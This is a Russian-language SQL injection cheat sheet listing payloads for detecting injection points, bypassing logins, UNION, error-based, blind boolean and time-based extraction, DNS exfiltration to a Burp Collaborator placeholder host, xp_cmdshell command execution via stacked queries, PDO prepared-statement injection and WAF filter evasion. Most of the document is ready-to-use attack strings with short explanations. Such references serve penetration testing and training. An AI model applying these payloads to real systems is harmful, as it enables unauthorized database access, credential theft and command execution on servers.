# SQLinjection

> SQL-инъекция (SQLi) — это тип уязвимости безопасности, который позволяет злоумышленнику вмешиваться в запросы, которые приложение выполняет к своей базе данных. SQL-инъекция является одной из самых распространённых и серьёзных уязвимостей веб-приложений, позволяя злоумышленникам выполнять произвольный SQL-код в базе данных. Это может привести к несанкционированному доступу к данным, манипулированию данными и, в некоторых случаях, к полной компрометации сервера базы данных.

# Обнаружение точки входа

Обнаружение точки входа при SQL-инъекции (SQLi) включает выявление мест в приложении, где пользовательский ввод не sanitized должным образом перед включением в SQL-запросы.

*	**Сообщения об ошибках**: Ввод специальных символов (например, одинарной кавычки ') в поля ввода может вызвать ошибки SQL. Если приложение отображает подробные сообщения об ошибках, это может указывать на потенциальную точку SQL-инъекции.

	*	Простые символы: `'`, `"`, `;`, `)` и `*`
	*	Простые символы в кодировке: `%27`, `%22`, `%23`, `%3B`, `%29` и `%2A`
	*	Множественное кодирование: `%%2727`, `%25%27`
	*	Unicode-символы: `U+02BA`, `U+02B9`
		*	MODIFIER LETTER DOUBLE PRIME (`U+02BA` в кодировке `%CA%BA`) преобразуется в `U+0022` QUOTATION MARK (`)
		*	MODIFIER LETTER PRIME (`U+02B9` в кодировке `%CA%B9`) преобразуется в U+0027 APOSTROPHE (')

* **SQL-инъекция на основе тавтологии**: Вводя тавтологические (всегда истинные) условия, можно проверить наличие уязвимостей. Например, ввод `admin' OR '1'='1` в поле имени пользователя может позволить войти как администратор, если система уязвима.

* **Объединение символов**

```
`+HERP
'||'DERP
'+'HERP
' 'DERP
'%20'HERP
'%2B'HERP
```

* **Логическое тестирование**

```
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
* **Атаки по времени**: Ввод SQL-команд, вызывающих намеренные задержки (например, с использованием функций SLEEP или BENCHMARK в MySQL), может помочь выявить потенциальные точки инъекции. Если приложение отвечает необычно долго после такого ввода, оно может быть уязвимо.

# Обход аутентификации

В стандартном механизме аутентификации пользователи предоставляют имя пользователя и пароль. Приложение обычно проверяет эти учётные данные в базе данных. Например, SQL-запрос может выглядеть примерно так:
```python
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```
Злоумышленник может попытаться внедрить вредоносный SQL-код в поля имени пользователя или пароля. Например, если злоумышленник введёт следующее в поле имени пользователя:
```python
' OR '1'='1'--
```
Эта полезная нагрузка внедряет всегда истинное утверждение в поле имени пользователя и комментирует остальную часть SQL-запроса. Злоумышленник может написать что угодно в поле пароля, потому что результирующий SQL-запрос больше не будет его проверять.
```python
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';
```
Здесь `'1'='1'` всегда истинно, что означает, что запрос может вернуть действительного пользователя, эффективно обходя проверку аутентификации.

⚠️ В этом случае база данных вернёт массив результатов, потому что совпадут все пользователи в таблице. Это вызовет ошибку на стороне сервера, так как ожидался только один результат. Добавив предложение LIMIT, можно ограничить количество возвращаемых строк.

Отправив следующую полезную нагрузку в поле имени пользователя, вы войдёте как первый пользователь в базе данных. Кроме того, вы можете внедрить полезную нагрузку в поле пароля, используя правильное имя пользователя для targeted атаки на конкретного пользователя.

`' or 1=1 limit 1 --`

⚠️ Избегайте использования этой полезной нагрузки без разбора, так как она всегда возвращает истину. Она может взаимодействовать с конечными точками, которые могут случайно удалить сессии, файлы, конфигурации или данные базы данных.

## Хешированные пароли

> К 2026 году приложения почти никогда не хранят пароли в открытом виде. Системы аутентификации вместо этого используют представление пароля (хеш, полученный с помощью функции derivation ключа, часто с солью). Эта эволюция меняет механику некоторых классических обходов SQL-инъекций (SQLi): злоумышленник, который внедряет строки через UNION, теперь должен предоставить значения, соответствующие stored representation, которое ожидает приложение, а не сырой пароль пользователя.

Многие наивные потоки аутентификации выполняют следующие высокоуровневые шаги:

* Запрос к базе данных для записи пользователя (например, SELECT username, password_hash FROM users WHERE username = ?).
* Получение stored password_hash из БД.
* Локальное вычисление hash(input_password) с использованием настроенного алгоритма.
* Сравнение stored_password_hash == hash(input_password).

Если злоумышленник может внедрить дополнительную строку в набор результатов (например, используя UNION), он может заставить приложение получить контролируемый злоумышленником stored_password_hash. Если этот внедрённый хеш равен hash(attacker_supplied_password), вычисленному приложением, сравнение успешно, и злоумышленник аутентифицируется как внедрённое имя пользователя.
```pyhton
admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--
```
* `AND 1=0`: чтобы заставить запрос быть ложным.
* `SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'`: выбрать столько столбцов, сколько необходимо, здесь 161ebd7d45089b3446ee4e0d86dbcf92 соответствует MD5("P@ssw0rd").

Если приложение вычисляет `MD5("P@ssw0rd")` и это равно `161ebd7d45089b3446ee4e0d86dbcf92`, то предоставление `P@ssw0rd` в качестве пароля для входа пройдёт проверку.

> Этот метод не работает, если приложение хранит соль и KDF(salt, password). Один внедрённый статический хеш не может совпасть с результатом для каждого пользователя с солью, если только злоумышленник не знает или не контролирует соль и параметры KDF.

# Инъекции на основе UNION

> В стандартном SQL-запросе данные извлекаются из одной таблицы. Оператор UNION позволяет объединять несколько SELECT-запросов. Если приложение уязвимо для SQL-инъекции, злоумышленник может внедрить специально созданный SQL-запрос, который добавляет оператор UNION к исходному запросу.

* Уязвимое веб-приложение извлекает детали продукта на основе идентификатора продукта из базы данных:
```python
SELECT product_name, product_price FROM products WHERE product_id = 'input_id';
```
* Злоумышленник может изменить `input_id`, чтобы включить данные из другой таблицы, например users.
```python
1' UNION SELECT username, password FROM users --
```
* После отправки нашей полезной нагрузки запрос становится следующим SQL:
```python
SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';
```
⚠️ Оба SELECT-запроса должны иметь одинаковое количество столбцов.
```python
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
ASC,(SELECT 1 FROM information_schema.tables)
JOIN (SELECT 1) A JOIN (SELECT 2) B JOIN (SELECT 3) C ... - для обхода ограничений и расширения возможностей запроса
```
```python
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
# Инъекции на основе ошибок

> Error-Based SQL Injection — это техника, которая полагается на сообщения об ошибках, возвращаемые базой данных, для сбора информации о структуре базы данных. Манипулируя входными параметрами SQL-запроса, злоумышленник может заставить базу данных генерировать сообщения об ошибках. Эти ошибки могут раскрыть критически важные детали о базе данных, такие как имена таблиц, имена столбцов и типы данных, которые можно использовать для создания дальнейших атак.
```ASC,CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)```
Например, в PostgreSQL внедрение этой полезной нагрузки в SQL-запрос приведёт к ошибке, так как предложение LIMIT ожидает числовое значение.
```python
LIMIT CAST((SELECT version()) as numeric) 
```
Ошибка раскроет вывод version().
```python
ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 on x86_64-pc-linux-gnu"
```
# Слепые инъекции

> Blind SQL Injection — это тип атаки SQL-инъекции, который задаёт базе данных вопросы «истина или ложь» и определяет ответ на основе реакции приложения.

## Инъекции на основе булевых значений

> Атаки полагаются на отправку SQL-запроса в базу данных, заставляя приложение возвращать другой результат в зависимости от того, возвращает ли запрос TRUE или FALSE. Злоумышленник может вывести информацию на основе различий в поведении приложения.

Размер страницы, код HTTP-ответа или отсутствующие части страницы являются сильными индикаторами для обнаружения успешности слепой SQL-инъекции на основе булевых значений.

**Пример для восстановления содержимого переменной @@hostname.**

* **Определить точку инъекции и подтвердить уязвимость**: Внедрить полезную нагрузку, которая оценивается как true/false, чтобы подтвердить уязвимость SQL-инъекции.
```python 
http://example.com/item?id=1 AND 1=1 -- (Ожидается: нормальный ответ)
http://example.com/item?id=1 AND 1=2 -- (Ожидается: другой ответ или ошибка)
```
* **Извлечь длину hostname**: Угадать длину hostname, увеличивая значение, пока ответ не укажет на совпадение.
```python
http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Ожидается: без изменений)
http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Ожидается: без изменений)
http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Ожидается: изменение в ответе)
```
* **Извлечь символы hostname**: Извлечь каждый символ hostname, используя substring и сравнение ASCII
```python
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 -- 
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 -- 
```
Затем повторить метод, чтобы обнаружить каждый символ @@hostname. Очевидно, этот пример не самый быстрый способ получить их. 

* **Лучше извлекать символы с помощью дихотомии**: это сокращает количество запросов с линейного до логарифмического времени, делая извлечение данных гораздо более эффективным.

## Слепые инъекции на основе ошибок

> Атаки полагаются на отправку SQL-запроса в базу данных, заставляя приложение возвращать другой результат в зависимости от того, успешно ли выполнен запрос или вызвана ошибка. В этом случае мы выводим успех только из ответа сервера, но данные не извлекаются из вывода ошибки.

* **Пример**: Использование функции json() в SQLite для вызова ошибки в качестве оракула, чтобы узнать, когда инъекция истинна или ложна.
```python
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
```
## Инъекции на основе времени

> Time-based SQL Injection — это тип слепой SQL-инъекции, который полагается на задержки базы данных для вывода о том, возвращают ли определённые запросы true или false. Он используется, когда приложение не отображает никакой прямой обратной связи от запросов к базе данных, но позволяет выполнение SQL-команд с задержкой по времени. Злоумышленник может анализировать время, необходимое базе данных для ответа, чтобы косвенно собрать информацию из базы данных.

* **Функция SLEEP по умолчанию для базы данных**
```
' AND SLEEP(5)/*
' AND '1'='1' AND SLEEP(5)
' ; WAITFOR DELAY '00:00:05' --
```
|BSD | payload |
|-----|--------|
|Oracle | 		dbms_pipe.receive_message(('a'),10) |
|Microsoft | 	WAITFOR DELAY '0:0:10' |
|PostgreSQL | 	SELECT pg_sleep(10) |
|MySQL |		SELECT SLEEP(10) |

* **Тяжёлые запросы, которые занимают много времени, обычно криптографические функции.**
```python
BENCHMARK(2000000,MD5(NOW()))
```
* Базовый пример восстановления версии базы данных с использованием time-based SQL-инъекции.
```python
http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
```
Если ответ сервера занимает несколько секунд перед получением, значит версия начинается с `5`.

## Внеполосные (OAST)

> Out-of-Band SQL Injection (OOB SQLi) происходит, когда злоумышленник использует альтернативные каналы связи для эксфильтрации данных из базы данных. В отличие от традиционных техник SQL-инъекций, которые полагаются на немедленные ответы в HTTP-ответе, OOB SQL-инъекция зависит от способности сервера базы данных устанавливать сетевые соединения с контролируемым злоумышленником сервером. Этот метод особенно полезен, когда результаты внедрённой SQL-команды не видны напрямую или ответы сервера не стабильны или надёжны.

Разные базы данных предлагают различные методы для создания внеполосных соединений, наиболее распространённая техника — DNS-эксфильтрация:

* **MySQL**
```python
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```
* **MSSQL**
```python
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```
# Инъекции на основе стека

> Stacked Queries SQL Injection — это техника, при которой несколько SQL-запросов выполняются в одном запросе, разделённые разделителем, таким как точка с запятой (;). Это позволяет злоумышленнику выполнять дополнительные вредоносные SQL-команды после легитимного запроса. Не все базы данных или конфигурации приложений поддерживают stacked queries.
```python
1; EXEC xp_cmdshell('whoami') --
```
# Полиглотные инъекции

> Полиглотная полезная нагрузка SQL-инъекции — это специально созданная строка атаки SQL-инъекции, которая может успешно выполняться в нескольких контекстах или средах без модификации. Это означает, что полезная нагрузка может обойти различные типы валидации, парсинга или логики выполнения в веб-приложении или базе данных, будучи валидным SQL в различных сценариях.
```python
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
# Маршрутизированные инъекции

> Маршрутизированная SQL-инъекция — это ситуация, когда инъектируемый запрос не тот, который даёт вывод, но вывод инъектируемого запроса идёт в запрос, который даёт вывод. — Zenodermus Javanicus

Короче говоря, результат первого SQL-запроса используется для построения второго SQL-запроса. Обычный формат: `' union select 0xHEXVALUE --` где `HEX` — это SQL-инъекция для второго запроса.

* **Пример 1:**
```python
0x2720756e696f6e2073656c65637420312c3223 — это hex-кодировка ' union select 1,2#

' union select 0x2720756e696f6e2073656c65637420312c3223#
```
* **Пример 2:**
```python
0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 — это hex-кодировка -1' union select login,password from users-- a.

-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
# SQL-инъекции второго порядка

> Second Order SQL Injection — это подтип SQL-инъекции, при котором вредоносная полезная нагрузка SQL в первую очередь сохраняется в базе данных приложения, а затем выполняется другой функциональностью того же приложения. В отличие от SQLi первого порядка, инъекция не происходит сразу. Она срабатывает на отдельном шаге, часто в другой части приложения.

1. Пользователь отправляет ввод, который сохраняется (например, при регистрации или обновлении профиля).
```python
Имя пользователя: attacker'--
Email: attacker@example.com
```
2. Этот ввод сохраняется без валидации, но не вызывает SQL-инъекцию.
```python
INSERT INTO users (username, email) VALUES ('attacker\'--', 'attacker@example.com');
```
3. Позже приложение извлекает и использует сохранённые данные в SQL-запросе.
```python
query = "SELECT * FROM logs WHERE username = '" + user_from_db + "'"
```
4. Если этот запрос построен небезопасно, инъекция срабатывает.

# Подготовленные выражения PDO

> PDO, или PHP Data Objects, — это расширение для PHP, которое предоставляет согласованный и безопасный способ доступа и взаимодействия с базами данных. Оно разработано для предоставления стандартизированного подхода к взаимодействию с базами данных, позволяя разработчикам использовать согласованный API для различных типов баз данных, таких как MySQL, PostgreSQL, SQLite и других.

PDO позволяет привязывать входные параметры, что гарантирует, что пользовательские данные должным образом sanitized перед выполнением в составе SQL-запроса. Однако оно всё ещё может быть уязвимо для SQL-инъекций, если разработчики допустили пользовательский ввод внутрь SQL-запроса.

Требования:

* СУБД
	* **MySQL** уязвим по умолчанию.
	* **Postgres** не уязвим по умолчанию, если только эмуляция не включена с PDO::ATTR_EMULATE_PREPARES => true.
	* **SQLite** не уязвим для этой атаки.

* SQL-инъекция где угодно внутри PDO-выражения: `$pdo->prepare("SELECT $INJECT_SQL_HERE...")`.

* PDO используется для другого SQL-параметра, либо с `?` или `:parameter`.
```python
$pdo = new PDO(APP_DB_HOST, APP_DB_USER, APP_DB_PASS);
$col = '`' . str_replace('`', '``', $_GET['col']) . '`';

$stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = ?");
$stmt->execute([$_GET['name']]);
// or
$stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = :name");
$stmt->execute(['name' => $_GET['name']]);
```
* **Методология:**

**ПРИМЕЧАНИЕ**: В PHP 8.3 и ниже инъекция происходит даже без нулевого байта (\0). Злоумышленнику нужно только внедрить ":" или "?".

* Обнаружьте SQLi с помощью `?#\0`: `GET /index.php?col=%3f%23%00&name=anything`
```python
# 1-я полезная нагрузка: ?#\0
# 2-я полезная нагрузка: anything
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '`'anything'#' at line 1
```
* Заставить выбрать `'x` вместо имени столбца и создать комментарий. Внедрить обратную кавычку, чтобы исправить столбец и завершить SQL-запрос с `;#`: `GET /index.php?col=%3f%23%00&name=x%60;%23`
```python
# 1-я полезная нагрузка: ?#\0
# 2-я полезная нагрузка: x`;#
Column not found: 1054 Unknown column ''x' in 'SELECT'
```
* Внедрить во второй параметр полезную нагрузку. `GET /index2.php?col=\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+'x+from+information_schema.tables)y%3b%2523`
```python
# 1-я полезная нагрузка: \?#\0
# 2-я полезная нагрузка: x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23
ALL_PLUGINS
APPLICABLE_ROLES
CHARACTER_SETS
CHECK_CONSTRAINTS
COLLATIONS
COLLATION_CHARACTER_SET_APPLICABILITY
COLUMNS
```
* Итоговые `SQL-запросы`
```python
-- До $pdo->prepare
SELECT `\?#\0` FROM animals WHERE name = ?

-- После $pdo->prepare
SELECT `\'x` FROM (SELECT table_name AS `\'x` from information_schema.tables)y;#'#\0` FROM animals WHERE name = ?
```

# Общий обход WAF

## Пробелы запрещены

> Некоторые веб-приложения пытаются защитить свои SQL-запросы, блокируя или удаляя символы пробела, чтобы предотвратить простые атаки SQL-инъекций. Однако злоумышленники могут обойти эти фильтры, используя альтернативные символы пробела, комментарии или творческое использование круглых скобок.

### Альтернативные символы пробела

> Большинство баз данных интерпретируют определённые управляющие символы ASCII и закодированные пробелы (такие как табуляция, новые строки и т.д.) как пробелы в SQL-запросах. Кодируя эти символы, злоумышленники часто могут обойти фильтры на основе пробелов.

| Пример полезной нагрузки         | Описание                           |
|-----------------------------------|------------------------------------|
| ?id=1%09and%091=1%09--            | `%09` — табуляция (\t)               |
| ?id=1%0Aand%0A1=1%0A--            | `%0A` — перевод строки (\n)          |
| ?id=1%0Band%0B1=1%0B--            | `%0B` — вертикальная табуляция       |
| ?id=1%0Cand%0C1=1%0C--            | `%0C` — подача формы                 |
| ?id=1%0Dand%0D1=1%0D--            | `%0D` — возврат каретки (\r)         |
| ?id=1%A0and%A01=1%A0--            | `%A0` — неразрывный пробел           |

* Поддержка пробельных символов ASCII базами данных:

| СУБД       | Поддерживаемые пробельные символы (Hex)                                                                 |
|------------|----------------------------------------------------------------------------------------------------------|
| SQLite3    | 0A, 0D, 0C, 09, 20                                                                                       |
| MySQL 5    | 09, 0A, 0B, 0C, 0D, A0, 20                                                                               |
| MySQL 3    | 01–1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0                                                       |
| PostgreSQL | 0A, 0D, 0C, 09, 20                                                                                       |
| Oracle 11g | 00, 0A, 0D, 0C, 09, 20                                                                                   |
| MSSQL      | 01–1F, 20                                                                                                |

### Обход с помощью комментариев и круглых скобок

* SQL допускает комментарии и группировку, которые могут разбивать ключевые слова и запросы, таким образом обходя фильтры пробелов:

| Обход                                             | Техника               |
|---------------------------------------------------|-----------------------|
| ?id=1/*comment*/AND/**/1=1/**/--                  | Комментарий           |
| ?id=1/*!12345UNION*//*!12345SELECT*/1--           | Условный комментарий  |
| ?id=(1)and(1)=(1)--                               | Круглые скобки        |

## Запятые запрещены

* Обход с использованием OFFSET, FROM и JOIN.

| Запрещено         | Обход                                                                 |
|-------------------|-----------------------------------------------------------------------|
| LIMIT 0,1         | LIMIT 1 OFFSET 0                                                      |
| SUBSTR('SQL',1,1) | SUBSTR('SQL' FROM 1 FOR 1)                                            |
| SELECT 1,2,3,4    | UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d |

## Равенство запрещено

* Обход с использованием LIKE/NOT IN/IN/BETWEEN

| Обход    | Пример SQL                                                      |
|----------|-----------------------------------------------------------------|
| LIKE     | SUBSTRING(VERSION(),1,1)LIKE(5)                                 |
| NOT IN   | SUBSTRING(VERSION(),1,1)NOT IN(4,3)                             |
| IN       | SUBSTRING(VERSION(),1,1)IN(4,3)                                 |
| BETWEEN  | SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4                        |

## Изменение регистра

* Обход с использованием верхнего/нижнего регистра.

| Обход | Техника       |
|-------|---------------|
| AND   | Верхний регистр |
| and   | Нижний регистр |
| aNd   | Смешанный регистр |

* Обход с использованием нечувствительных к регистру ключевых слов или эквивалентного оператора.

| Запрещено | Обход                     |
|-----------|---------------------------|
| AND       | &&                        |
| OR        | \|\|                      |
| =         | LIKE, REGEXP, BETWEEN     |
| >         | NOT BETWEEN 0 AND X       |
| WHERE     | HAVING                    |
